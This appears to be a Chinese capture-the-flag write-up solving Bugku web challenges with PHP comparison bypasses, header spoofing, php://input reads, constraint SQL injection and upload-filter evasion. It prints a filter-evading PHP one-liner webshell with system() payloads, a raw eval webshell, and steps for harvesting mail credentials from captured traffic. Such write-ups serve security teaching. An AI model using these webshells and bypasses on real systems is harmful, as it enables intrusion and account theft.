e0b8e8e HEAD@{7}: commit (initial): this is index.html

###### git show可以用于显示提交日志的相关信息（以不同格式或信息量的多少）

git show 40c6d51 （一个一个的试）即可得到flag。

#### 社工-伪造

##### 此题的qq是和现实qq绑定的，修改头像和qq名称，再登陆，发送flag即可得到flag。

#### 社工-初步收集

###### 知识点

###### 这里的话，设计一个知识点就是遇到这种开挂的软件或者别的软件时，我们可以查看流量的走向，这里就需要使用工具——[wireshark](https://so.csdn.net/so/search?q=wireshark&spm=1001.2101.3001.7020)就行抓流量包进行分析

###### SMTP是一个相对简单的基于文本的协议。

##### 1.打开网址发现啥也没有，老规矩先用御剑扫描目录。

可以找到config.php, includes/, admin/, admin/index.php, admin/login.php, admin/logo.php, index.php?.php, ?.php

##### 2.打开login.php,发现是一个后台登陆界面。尝试一下弱口令登录失败。

##### 3.下载网址提供的软件，打开用wireshark抓包，搜索SMTP

发现from: bugkuku@163.com, subjet: =?gb2312?B0KGx8NbCyc+1scHLo6GjoaOh?=,

User: YnVna3VrdUAxNjMuY29t   Pass:WFNMUk9DUE1OV1daUURaTA==

base64解码bugkuku@163.com   XSLROCPMNWWZQDZL  后台发现登陆不上，看其账号应该是一个邮箱登陆的账号密码。但是163邮箱登陆不上，第二个应该是授权码。

##### 3.下一个手机qq邮箱，使用163邮箱+授权码登陆

一直向下滑找到一封特别的邮件，说给mara发生日礼物，通过照片猜测其生日是20010206，登陆后台。

成功找到flag。

##### 总结社工很离谱。

#### shell

##### 总结php代码执行函数eval(),assert(),preg_replace(),creat_function(),arry_map(),call_user_func(),call_user_func_array(),array_filter(),uasort()

送给大家一个过狗一句话 $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s'])

代码意思是用explode函数使用#将$poc分成一个数组，再使用poc_2将poc_1数组组合即assert，再用assert执行代码执行函数，即system('ls')

构造 ?s=system('ls')和?s=system("cat flaga15808abee46a1d5.txt")即可得到flag

#### 速度要快

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&#x27;http://114.67.175.224:17682/&#x27;</span></span><br><span class="line">r=requests.session()//因为get和post请求头不同，所以需要建立一个会话</span><br><span class="line">res=r.get(url)</span><br><span class="line"></span><br><span class="line">enflag=res.headers[<span class="string">&#x27;flag&#x27;</span>] //打印响应头flag的信息</span><br><span class="line"></span><br><span class="line">deflag=base64.b64decode(enflag) //对flag的值base64解密</span><br><span class="line">flag=deflag.decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&quot;: &quot;</span>)[<span class="number">1</span>] //用“：”将解密后的flag分割取第二个</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">deflag1=base64.b64decode(flag).decode(<span class="string">&#x27;utf-8&#x27;</span>) //再把第二个flag的值解密</span><br><span class="line"><span class="built_in">print</span>(deflag1)</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;margin&#x27;</span>:deflag1    //添加两次base64解密的值（是一串数字）</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(r.post(url,data=data).text)   //使用用一个会话发送post请求，即可得到flag</span><br><span class="line"><span class="built_in">print</span>(r.post(url,data=data).headers)</span><br></pre></td></tr></table></figure>

<h4 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h4><h5 id="点击链接即可得到得到index-php的源代码"><a href="#点击链接即可得到得到index-php的源代码" class="headerlink" title="点击链接即可得到得到index.php的源代码"></a>点击链接即可得到得到index.php的源代码</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$v1</span> != <span class="variable">$v2</span> &amp;&amp; md5(<span class="variable">$v1</span>) == md5(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp(<span class="variable">$v3</span>, <span class="variable">$flag</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>[114.67.175.224:14251/?v1=QNKCDZO&amp;v2=240610708&amp;v3<a target="_blank" rel="noopener" href="http://114.67.175.224:14251/?v1=QNKCDZO&v2=240610708&v3%5B%5D=flag%7B01">]=flag{01</a></p>
<p>php&lt;5.3中，若strcmp参数是数组，即会返回0，即比较成功。MD5传入两个都是0e开头的即可绕过，或者两个参数都是数组也能绕过。</p>
<p>?v1[]=1&amp;v2[]=2&amp;v3[]=flag{01</p>
<p>这样就得到flag</p>
<h4 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h4><h5 id="增加请求头-Referer-www-google-com-即可得到flag"><a href="#增加请求头-Referer-www-google-com-即可得到flag" class="headerlink" title="增加请求头 Referer: www.google.com 即可得到flag"></a>增加请求头 Referer: <a target="_blank" rel="noopener" href="http://www.google.com/">www.google.com</a> 即可得到flag</h5><h4 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://114.67.175.224:14136/&#x27;</span></span><br><span class="line">r=requests.session() <span class="comment">#建立一个会话使get和post在一个会话里</span></span><br><span class="line">res=r.get(url)</span><br><span class="line">v=res.text.split(<span class="string">&quot;&lt;div&gt;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;=&quot;</span>)[<span class="number">0</span>]  <span class="comment">#分别使用&lt;div&gt;分割取第二个数组再使用=分割取第一个数组内容</span></span><br><span class="line">key=<span class="built_in">eval</span>(v)  <span class="comment">#计算字符串算术表达式的值</span></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>:key   <span class="comment">#添加请求头</span></span><br><span class="line">&#125;</span><br><span class="line">res1=r.post(url,data=data)  <span class="comment">#post请求</span></span><br><span class="line"><span class="built_in">print</span>(res1.text)</span><br><span class="line"><span class="comment">#Give me value post about  #多刷新几次可以得到这个提示</span></span><br></pre></td></tr></table></figure>

<h4 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never_give_up"></a>never_give_up</h4><h5 id="1-是javascript代码"><a href="#1-是javascript代码" class="headerlink" title="1.是javascript代码"></a>1.是javascript代码</h5><h6 id="查看源代码，提示1p-html-在浏览器上写入跳转到另一个网址，使用bp抓包，成功抓到一下内容："><a href="#查看源代码，提示1p-html-在浏览器上写入跳转到另一个网址，使用bp抓包，成功抓到一下内容：" class="headerlink" title="查看源代码，提示1p.html,在浏览器上写入跳转到另一个网址，使用bp抓包，成功抓到一下内容："></a>查看源代码，提示1p.html,在浏览器上写入跳转到另一个网址，使用bp抓包，成功抓到一下内容：</h6><p>var Words =”%3Cscript%3Ewindow.location.href%3D’http%3A%2F%2F<a target="_blank" rel="noopener" href="http://www.bugku.com&/#39;%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E&quot;">www.bugku.com&#39;%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E&quot;</a><br>function OutWord()<br>{<br>var NewWords;<br>NewWords = unescape(Words);  //解码<br>document.write(NewWords);<br>}<br>OutWord();</p>
<h5 id="2-先url解码得到"><a href="#2-先url解码得到" class="headerlink" title="2.先url解码得到"></a>2.先url解码得到</h5><p>第一段代码表示到这个页面就跳转到<a target="_blank" rel="noopener" href="http://www.bugku.com(怪不得会跳转到另一个网址)/">http://www.bugku.com（怪不得会跳转到另一个网址）</a></p>
<script>window.location.href='http://www.bugku.com';</script> 

<!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF-->

<h6 id="直接base64解码-url解码得到"><a href="#直接base64解码-url解码得到" class="headerlink" title="直接base64解码+url解码得到"></a>直接base64解码+url解码得到</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;if(!<span class="subst">$_GET</span>[&#x27;id&#x27;])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	header(&#x27;Location: hello.php?id=1&#x27;);</span></span><br><span class="line"><span class="string">	exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$id</span>=<span class="subst">$_GET</span>[&#x27;id&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$a</span>=<span class="subst">$_GET</span>[&#x27;a&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$b</span>=<span class="subst">$_GET</span>[&#x27;b&#x27;];</span></span><br><span class="line"><span class="string">if(stripos(<span class="subst">$a</span>,&#x27;.&#x27;))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	echo &#x27;no no no no no no no&#x27;;</span></span><br><span class="line"><span class="string">	return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$data</span> = @file_get_contents(<span class="subst">$a</span>,&#x27;r&#x27;); //参数是路径</span></span><br><span class="line"><span class="string">if(<span class="subst">$data</span>==&quot;</span>bugku is a nice plateform!<span class="string">&quot; and <span class="subst">$id</span>==0 and strlen(<span class="subst">$b</span>)&gt;5 and eregi(&quot;</span><span class="number">111</span><span class="string">&quot;.substr(<span class="subst">$b</span>,0,1),&quot;</span><span class="number">1114</span><span class="string">&quot;) and substr(<span class="subst">$b</span>,0,1)!=4)  //.代表拼接 eregi()表示满足’111’接上b的首个字符是’1114’的通配（代表正则匹配）</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	<span class="subst">$flag</span> = &quot;</span>flag&#123;***********&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	print &quot;</span>never never never give up !!!<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>*<em>GET /hello.php?id=0a&amp;b=<em>12345&amp;a=php://input HTTP/1.1</em></em></p>
<p><strong>弱类型==：’字符串’会转为整数，1a也会转为整数。所以id=0a或者“0a”都可以</strong></p>
<p><strong>eregi和ereg都有ereg() 函数或 eregi() 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。</strong></p>
<h6 id="源码中待匹配字符串（第二个参数）已确定为-“1114”，正则表达式（第一个参数）由-“111”-连接-b-的第一个字符组成，若令-substr-b-0-1-“-x00”，即满足-“1114”-与-“111”匹配。因此，这里假设-b-“-x0012345”，才能满足条件。"><a href="#源码中待匹配字符串（第二个参数）已确定为-“1114”，正则表达式（第一个参数）由-“111”-连接-b-的第一个字符组成，若令-substr-b-0-1-“-x00”，即满足-“1114”-与-“111”匹配。因此，这里假设-b-“-x0012345”，才能满足条件。" class="headerlink" title="源码中待匹配字符串（第二个参数）已确定为 “1114”，正则表达式（第一个参数）由 “111” 连接 $b 的第一个字符组成，若令 substr($b,0,1) = “\x00”，即满足 “1114” 与 “111”匹配。因此，这里假设 $b = “\x0012345”，才能满足条件。"></a><strong>源码中待匹配字符串（第二个参数）已确定为 “1114”，正则表达式（第一个参数）由 “111” 连接 $b 的第一个字符组成，若令 substr($b,0,1) = “\x00”，即满足 “1114” 与 “111”匹配。因此，这里假设 $b = “\x0012345”，才能满足条件。</strong></h6><p><strong>或者用12345因为*是任意字符匹配，所以也行。</strong></p>
<p><strong>@file</strong><strong>_get_contents传入路径，所以用源码中变量 $data 是由 file_get_contents() 函数读取变量 $a 的值而得，所以 $a 的值必须为数据流</strong>。****</p>
<p><strong>在服务器中自定义一个内容为 bugku is a nice plateform! 文件，再把此文件路径赋值给 $a，显然不太靠谱。</strong></p>
<p><strong>因此这里用伪协议 php:// 来访问输入输出的数据流，其中 php://input可以访问原始请求数据中的只读流。</strong></p>
<p><strong>这里令 $a = “php://input”，并在请求主体中提交字符串 bugku is a nice plateform!。</strong></p>
<h6 id="只填入bugku-is-a-nice-plateform"><a href="#只填入bugku-is-a-nice-plateform" class="headerlink" title="只填入bugku is a nice plateform!"></a>只填入bugku is a nice plateform!</h6><h4 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h4><h5 id="请求头加入X-Forwarded-For-127-0-0-1即可得到flag"><a href="#请求头加入X-Forwarded-For-127-0-0-1即可得到flag" class="headerlink" title="请求头加入X-Forwarded-For: 127.0.0.1即可得到flag"></a>请求头加入X-Forwarded-For: 127.0.0.1即可得到flag</h5><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><h5 id="题目是md5碰撞，所以赋给-a-s878926199a-即md5是0e开头的，即可得到flag。这个题目出得不好，连源码都不给。"><a href="#题目是md5碰撞，所以赋给-a-s878926199a-即md5是0e开头的，即可得到flag。这个题目出得不好，连源码都不给。" class="headerlink" title="题目是md5碰撞，所以赋给?a=s878926199a,即md5是0e开头的，即可得到flag。这个题目出得不好，连源码都不给。"></a>题目是md5碰撞，所以赋给?a=s878926199a,即md5是0e开头的，即可得到flag。这个题目出得不好，连源码都不给。</h5><h4 id="login1"><a href="#login1" class="headerlink" title="login1"></a>login1</h4><h6 id="约束SQL注入的原理就是利用的约束条件，比如最长只能有15个字符的话，如果你输入的是abcdefghijklmnop-16位），那么保存在数据库里的就是abcdefghijklmno，那么别人用abcdefghijklmno注册一个用户名，就可以登陆。"><a href="#约束SQL注入的原理就是利用的约束条件，比如最长只能有15个字符的话，如果你输入的是abcdefghijklmnop-16位），那么保存在数据库里的就是abcdefghijklmno，那么别人用abcdefghijklmno注册一个用户名，就可以登陆。" class="headerlink" title="约束SQL注入的原理就是利用的约束条件，比如最长只能有15个字符的话，如果你输入的是abcdefghijklmnop(16位），那么保存在数据库里的就是abcdefghijklmno，那么别人用abcdefghijklmno注册一个用户名，就可以登陆。"></a>约束SQL注入的原理就是利用的约束条件，比如最长只能有15个字符的话，如果你输入的是abcdefghijklmnop(16位），那么保存在数据库里的就是abcdefghijklmno，那么别人用abcdefghijklmno注册一个用户名，就可以登陆。</h6><h6 id="还有一个可以利用的地方就是SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的，也就是说”abc”-”abc-“，同样我们可以通过注册用户名为”abc-“的账号来登陆”abc”的账号。"><a href="#还有一个可以利用的地方就是SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的，也就是说”abc”-”abc-“，同样我们可以通过注册用户名为”abc-“的账号来登陆”abc”的账号。" class="headerlink" title="还有一个可以利用的地方就是SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的，也就是说”abc”==”abc “，同样我们可以通过注册用户名为”abc “的账号来登陆”abc”的账号。"></a>还有一个可以利用的地方就是SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的，也就是说”abc”==”abc “，同样我们可以通过注册用户名为”abc “的账号来登陆”abc”的账号。</h6><p>所以直接用admin ，注册一个账号，再登陆，admin 会变为admin从而进入管理员权限得到flag。</p>
<h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract(<span class="variable">$_GET</span>);  <span class="comment">//函数从数组中把变量导入到当前的符号表中</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$ac</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$f</span> = trim(file_get_contents(<span class="variable">$fn</span>));   <span class="comment">//需要使用get传入$fn和$ac,使他们相等</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ac</span> === <span class="variable">$f</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="string">&quot; <span class="subst">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="1-第一种方式是bp里GET-ac-flag-amp-fn-php-input-HTTP-1-1-内容是flag，即可得到flag"><a href="#1-第一种方式是bp里GET-ac-flag-amp-fn-php-input-HTTP-1-1-内容是flag，即可得到flag" class="headerlink" title="1.第一种方式是bp里GET /?ac=flag&amp;fn=php://input HTTP/1.1  内容是flag，即可得到flag"></a>1.第一种方式是bp里GET /?ac=flag&amp;fn=php://input HTTP/1.1  内容是flag，即可得到flag</h5><h5 id="2-114-67-175-224-18959-ac-flag-amp-fn-https-n9-zqc-github-io-test-txt-第二种是file-get-contents读取的是文件，所以在自己网站上上传一个内容和flag一样的文件即可，该网站一定能让外网访问才可以，"><a href="#2-114-67-175-224-18959-ac-flag-amp-fn-https-n9-zqc-github-io-test-txt-第二种是file-get-contents读取的是文件，所以在自己网站上上传一个内容和flag一样的文件即可，该网站一定能让外网访问才可以，" class="headerlink" title="2.114.67.175.224:18959/?ac=flag&amp;fn=https://n9-zqc.github.io/test.txt  第二种是file_get_contents读取的是文件，所以在自己网站上上传一个内容和flag一样的文件即可，该网站一定能让外网访问才可以，"></a>2.<a target="_blank" rel="noopener" href="http://114.67.175.224:18959/?ac=flag&fn=https://n9-zqc.github.io/test.txt">114.67.175.224:18959/?ac=flag&amp;fn=https://n9-zqc.github.io/test.txt</a>  第二种是file_get_contents读取的是文件，所以在自己网站上上传一个内容和flag一样的文件即可，该网站一定能让外网访问才可以，</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;&#125;else&#123;echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>This is flag: flag{482fe39bd95249216001178fb2c442a7}</p>
<p>使用linux中的apache和window中的phpstudy需要设置路由器啥的来让互联网访问太麻烦，不如用github提供的服务器，互联网可以直接访问。</p>
<h4 id="各种绕过哟"><a href="#各种绕过哟" class="headerlink" title="各种绕过哟"></a>各种绕过哟</h4><p><a target="_blank" rel="noopener" href="http://114.67.175.224:18451/?id=margin&amp;uname%5B%5D=1">http://114.67.175.224:18451/?id=margin&amp;uname[]=1</a> POST提交passwd[]=2 即可得到flag。</p>
<h5 id="sha1用数组绕过。"><a href="#sha1用数组绕过。" class="headerlink" title="sha1用数组绕过。"></a>sha1用数组绕过。</h5><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><?php @eval($_POST[caidao]);?>
<p>使用burp抓包，不断尝试发现发现需要修改的地方有三个：<br>一个是http head里的Content-Type: multipart/form-data;<br>请求头部的 Content-Type 内容 随便改个大写字母过滤掉 比如 mulTipart/form-data （其t为大写）<br>Multipart里的部分字母改成大写的。</p>
<p>第二个是文件的的Content-Type: application/octet-stream，改成image/jpeg</p>
<p>第三个是文件后缀名改成php4<br>（依次尝试php4，phtml，phtm，phps，php5（包括一些字母改变大小写））分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php4没有被过滤</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&lt;?php </span><br><span class="line">$flag = &quot;flag&#123;test&#125;&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


<form action="index.php" method="post" enctype="multipart/form-data">
My name is margin,give me a image file not a php<br>
<br>
<input type="file" name="file" id="file"> 
<input type="submit" name="submit" value="Submit">
</form>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">global_filter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$type</span> =  <span class="variable">$_SERVER</span>[<span class="string">&quot;CONTENT_TYPE&quot;</span>];   <span class="comment">//修改multipart/form-data绕过</span></span><br><span class="line">	<span class="keyword">if</span> (strpos(<span class="variable">$type</span>,<span 